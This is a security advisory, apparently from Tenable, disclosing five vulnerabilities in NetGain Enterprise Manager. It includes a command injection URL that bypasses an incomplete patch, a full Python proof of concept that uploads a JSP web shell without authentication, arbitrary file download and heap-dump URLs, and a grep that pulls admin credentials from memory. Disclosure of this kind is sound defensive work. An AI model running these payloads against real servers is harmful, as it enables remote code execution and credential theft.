# [R1] NetGain Enterprise Manager Multiple Remote Vulnerabilities

High

[← View More Research Advisories](/security/research)
### Synopsis

While researching a command injection vulnerability published on [Exploit Database](https://www.exploit-db.com/exploits/41499/), Tenable found multiple remote vulnerabilities in [NetGain Enterprise Manager](http://www.netgain-systems.com/netgain-enterprise-manager/).

#### CVE-2017-16608: Incomplete Command Injection Patch

NetGain tried to patch the Exploit-DB command injection vulnerability in 7.2.586 build 877. The patch prevented the command injection by adding the following logic:

1. The argument parameter must be a valid IP address
2. The command must start with “*cmd /c ping*” or "*ping –c 5*"

The obvious problem is that an attacker can append additional information after the required command text. For instance, an attacker could make a new directory by using the command argument "*cmd /c ping || mkdir C:\Users\Public\fun ||*". The following URL is a complete example:

```

http://[target]:8081/u/jsp/tools/exec.jsp?command=cmd%20%2Fc%20ping%20%7C%7C%20mkdir%20C%3A%5CUsers%5CPublic%5Cfun%20%7C%7C&argument=127.0.0.1&async_output=nessus_56043399

```
#### CVE-2017-16610: Unauthenticated JSP Upload and Execution

An unauthenticated remote attacker can upload arbitrary files to the remote server via an HTTP POST request to */u/jsp/backup/upload\_save\_do.jsp*. This is particularly useful because NetGain EM has write access to the web root. Which means that an attacker can upload a JSP web shell. The following proof of concept uploads a web shell to the Javascript directory.

```

import requests
import sys
from requests_toolbelt.multipart.encoder import MultipartEncoder

if len(sys.argv) != 3:
    print 'Usage: ./nsg_backup_upload.py <server_address> <port>'
    print 'Example: python ./nsg_backup_upload.py 192.168.1.38 8081'
    sys.exit(0);

jsp_shell = (
    '<%@ page import=\"java.util.*,java.io.*\"%>\n'
    '<html><body>'
    '<form method=\"GET\" name=\"myform\" action=\"\">\n'
        '<input type=\"text\" name=\"cmd\">\n'
        '<input type=\"submit\" value=\"Send\">\n'
    '</form>\n'
    '<pre>\n'
    '<%\n'
        'if (request.getParameter(\"cmd\") != null) {\n'
            'out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<br>\");\n'
            'Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n'
            'OutputStream os = p.getOutputStream();\n'
            'InputStream in = p.getInputStream();\n'
            'DataInputStream dis = new DataInputStream(in);\n'
            'String disr = dis.readLine();\n'
            'while ( disr != null ) {\n'
                'out.println(disr);\n'
                'disr = dis.readLine();\n'
            '}\n'
        '}\n'
     '%>\n'
    '</pre></body></html>')

multipart_data = MultipartEncoder(
    fields =
    {
        'file': ('../u/js/shell.jsp', jsp_shell, 'text/plain')
    })

response = requests.post('http://' + sys.argv[1] + ':' + sys.argv[2] + '/u/jsp/backup/upload_save_do.jsp',
    data=multipart_data, headers={'Content-Type': multipart_data.content_type})

```
#### CVE-2017-16609: Unauthenticated File Download

An unauthenticated remote attacker can download any file on the remote server via an HTTP GET (or POST) request. The following URL will download *C:\Windows\win.ini*:

```
http://[target]:8081/u/jsp/common/download.jsp?filename=win.ini&srcDir=C:\Windows
```
#### CVE-2017-16607: Unauthenticated Information Disclosure

NetGain EM allows an unauthenticated remote attacker to download all of the process's heap memory using the following URL:

```
http://[target]:8081/u/jsp/settings/heapdumps.jsp?dumpnow=1
```

The attacker can then search the memory for interesting information such as credentials. For example, Tenable found the admin username and password in a dump using the following method:

```

albinolobster@ubuntu:~$ strings ./heapdump_2017_03_07_15_48_34.bin | grep username=
username=admin&password=thisismypassword%21

```
#### CVE-2017-17406: Unsafe Java Object Deserialization

NetGain EM exposes a couple of Java RMI Registries on ports 1800 and 1850. Also, NetGain uses a few Java libraries that are known to be useful in Java deserialization attacks including bsh, Apache Commons Collections, and Apache Commons FileUpload. Tenable confirmed an unauthenticated remote attacker could achieve remote code execution using a deserialization attack over RMI.

### Solution

Upgrade to NetGain Enterprise Manager 7.2.766 or later.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
